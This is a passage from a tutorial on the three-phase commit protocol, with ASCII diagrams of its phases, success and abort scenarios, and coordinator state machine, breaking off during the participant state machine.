<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         EVOLUTION: 2PC \u2192 3PC                            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1970s: Two-Phase Commit (Jim Gray, IBM)                \u2502\n\u2502        \u2022 Simple, widely adopted                         \u2502\n\u2502        \u2022 Problem: Blocking on coordinator failure       \u2502\n\u2502                                                         \u2502\n\u2502 1981: Three-Phase Commit (Dale Skeen, Berkeley)        \u2502\n\u2502        \u2022 Added PreCommit phase                          \u2502\n\u2502        \u2022 Non-blocking under single failures             \u2502\n\u2502        \u2022 Trade-off: More complex, more messages         \u2502\n\u2502                                                         \u2502\n\u2502 Reality: 2PC still dominates                            \u2502\n\u2502        \u2022 3PC rarely used in practice                    \u2502\n\u2502        \u2022 Network partitions remain problematic          \u2502\n\u2502        \u2022 Modern systems use consensus protocols         \u2502\n\u2502          (Paxos, Raft) instead                          \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>The Three Phases:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         THREE-PHASE COMMIT PROTOCOL                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 PHASE 1: CAN-COMMIT (Voting Phase)                      \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550                     \u2502\n\u2502 \u2022 Coordinator asks: \"Can you commit?\"                   \u2502\n\u2502 \u2022 Participants vote YES or NO                           \u2502\n\u2502 \u2022 If any NO \u2192 ABORT immediately                         \u2502\n\u2502 \u2022 If all YES \u2192 Proceed to Phase 2                       \u2502\n\u2502                                                         \u2502\n\u2502 PHASE 2: PRE-COMMIT (Preparation Phase) \u2b50 NEW!         \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550                 \u2502\n\u2502 \u2022 Coordinator sends: \"Prepare to commit\"                \u2502\n\u2502 \u2022 Participants acknowledge PreCommit                    \u2502\n\u2502 \u2022 Participants enter PRE-COMMITTED state                \u2502\n\u2502 \u2022 Now participants KNOW transaction will commit         \u2502\n\u2502 \u2022 This phase makes protocol non-blocking!               \u2502\n\u2502                                                         \u2502\n\u2502 PHASE 3: DO-COMMIT (Commit Phase)                       \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550                      \u2502\n\u2502 \u2022 Coordinator sends: \"Do commit\"                        \u2502\n\u2502 \u2022 Participants commit transaction                       \u2502\n\u2502 \u2022 Release locks and send ACK                            \u2502\n\u2502 \u2022 Transaction complete                                  \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>3PC Protocol Diagram (Success Scenario):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       3PC PROTOCOL - SUCCESSFUL COMMIT                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502   Coordinator              Participant A  Participant B \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 PHASE 1: CAN-COMMIT \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  1. CAN-COMMIT?                                 \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Can commit?         \u2502\n\u2502       \u2502                  \u2502          Check constraints   \u2502\n\u2502       \u2502                  \u2502          Vote: YES           \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Can commit?         \u2502\n\u2502       \u2502                  \u2502          Vote: YES           \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502  2. Collect votes (all YES)                     \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 YES                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 YES                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  Decision: Proceed to PreCommit                 \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 PHASE 2: PRE-COMMIT \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550        \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  3. PRE-COMMIT!                                 \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Write PreCommit log \u2502\n\u2502       \u2502                  \u2502          Enter PRE-COMMITTED \u2502\n\u2502       \u2502                  \u2502          ACK                 \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Write PreCommit log \u2502\n\u2502       \u2502                  \u2502          Enter PRE-COMMITTED \u2502\n\u2502       \u2502                  \u2502          ACK                 \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502  4. Collect ACKs (all received)                 \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  Write COMMIT to log                            \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 PHASE 3: DO-COMMIT \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550        \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  5. DO-COMMIT!                                  \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Commit transaction  \u2502\n\u2502       \u2502                  \u2502          Release locks       \u2502\n\u2502       \u2502                  \u2502          ACK                 \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Commit transaction  \u2502\n\u2502       \u2502                  \u2502          Release locks       \u2502\n\u2502       \u2502                  \u2502          ACK                 \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502  6. Transaction complete                        \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u25bc  Done!                                          \u2502\n\u2502                                                         \u2502\n\u2502 \u2705 RESULT: All committed successfully                   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>3PC Abort Scenario (Vote NO in Phase 1):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       3PC PROTOCOL - ABORT SCENARIO                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502   Coordinator              Participant A  Participant B \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 PHASE 1: CAN-COMMIT \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  1. CAN-COMMIT?                                 \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Can commit?         \u2502\n\u2502       \u2502                  \u2502          Vote: YES           \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Can commit?         \u2502\n\u2502       \u2502                  \u2502          [Constraint fails!] \u2502\n\u2502       \u2502                  \u2502          Vote: NO \u274c         \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502  2. Collect votes (got NO)                      \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 YES                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 NO                          \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  Decision: ABORT (immediate)                    \u2502\n\u2502       \u2502  Write ABORT to log                             \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 ABORT - Skip Phase 2 &amp; 3 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  3. ABORT!                                      \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Abort transaction   \u2502\n\u2502       \u2502                  \u2502          ACK                 \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Abort transaction   \u2502\n\u2502       \u2502                  \u2502          ACK                 \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502  4. Transaction aborted                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u25bc  Done                                           \u2502\n\u2502                                                         \u2502\n\u2502 \u274c RESULT: All aborted (no Phase 2/3 needed)            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Key Difference from 2PC - The PreCommit State:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    WHY PHASE 2 (PRE-COMMIT) MAKES 3PC NON-BLOCKING      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 In 2PC (BLOCKING):                                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 After voting YES, participant is BLOCKED \u2502           \u2502\n\u2502 \u2502 \u2022 Doesn't know if others voted YES       \u2502           \u2502\n\u2502 \u2502 \u2022 Cannot abort (might be only failure)   \u2502           \u2502\n\u2502 \u2502 \u2022 Cannot commit (don't know decision)    \u2502           \u2502\n\u2502 \u2502 \u2192 STUCK waiting for coordinator! \u274c      \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 In 3PC (NON-BLOCKING):                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 After receiving PRE-COMMIT:              \u2502           \u2502\n\u2502 \u2502 \u2022 Participant KNOWS all voted YES        \u2502           \u2502\n\u2502 \u2502 \u2022 Coordinator decided to commit          \u2502           \u2502\n\u2502 \u2502 \u2022 Transaction WILL eventually commit     \u2502           \u2502\n\u2502 \u2502 \u2022 If coordinator fails \u2192 COMMIT anyway!  \u2502           \u2502\n\u2502 \u2502 \u2192 Can make progress independently! \u2705    \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 State Knowledge:                                        \u2502\n\u2502 \u2022 BEFORE PreCommit: Transaction can still abort         \u2502\n\u2502   \u2192 If timeout, abort safely                            \u2502\n\u2502                                                         \u2502\n\u2502 \u2022 AFTER PreCommit: Transaction will commit              \u2502\n\u2502   \u2192 If timeout, commit safely                           \u2502\n\u2502                                                         \u2502\n\u2502 This distinction enables non-blocking behavior!         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>3PC State Machine - Coordinator:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       3PC COORDINATOR STATE MACHINE                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502  INIT    \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                       \u2502 Send CAN-COMMIT                 \u2502\n\u2502                       \u25bc                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502            \u250c\u2500\u2500\u2500\u2500\u2192\u2502  WAIT    \u2502                           \u2502\n\u2502            \u2502     \u2502(for votes\u2502                           \u2502\n\u2502            \u2502     \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502    Timeout \u2502          \u2502                                 \u2502\n\u2502    (ABORT) \u2502          \u2502 All votes received              \u2502\n\u2502            \u2502          \u25bc                                 \u2502\n\u2502            \u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502            \u2502     \u2502  DECIDE  \u2502                           \u2502\n\u2502            \u2502     \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502            \u2502          \u2502                                 \u2502\n\u2502            \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502            \u2502    \u2502           \u2502                           \u2502\n\u2502            \u2502    \u25bc           \u25bc                           \u2502\n\u2502            \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502                            \u2502\n\u2502            \u2514\u2500\u2502 ABORT  \u2502    \u2502 All YES                    \u2502\n\u2502              \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518    \u25bc                            \u2502\n\u2502                  \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                      \u2502\n\u2502                  \u2502    \u2502PRE-COMMIT\u2502 \u2b50 NEW STATE         \u2502\n\u2502                  \u2502    \u2502  (send)  \u2502                      \u2502\n\u2502                  \u2502    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                      \u2502\n\u2502                  \u2502         \u2502                            \u2502\n\u2502                  \u2502         \u2502 Wait for ACKs              \u2502\n\u2502                  \u2502         \u25bc                            \u2502\n\u2502                  \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                      \u2502\n\u2502                  \u2502    \u2502   WAIT   \u2502                      \u2502\n\u2502                  \u2502    \u2502(for ACKs)\u2502                      \u2502\n\u2502                  \u2502    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                      \u2502\n\u2502                  \u2502         \u2502                            \u2502\n\u2502                  \u2502         \u2502 All ACKs received          \u2502\n\u2502                  \u2502         \u25bc                            \u2502\n\u2502                  \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                      \u2502\n\u2502                  \u2502    \u2502DO-COMMIT \u2502                      \u2502\n\u2502                  \u2502    \u2502  (send)  \u2502                      \u2502\n\u2502                  \u2502    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                      \u2502\n\u2502                  \u2502         \u2502                            \u2502\n\u2502                  \u25bc         \u25bc                            \u2502\n\u2502              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                       \u2502\n\u2502              \u2502  WAIT FOR ACKS   \u2502                       \u2502\n\u2502              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                       \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                       \u2502 All ACKs                        \u2502\n\u2502                       \u25bc                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502   END    \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>3PC State Machine - Participant:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       3PC PARTICIPANT STATE MACHINE                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502  INIT    \u2502                           \u2502\n\u2502                  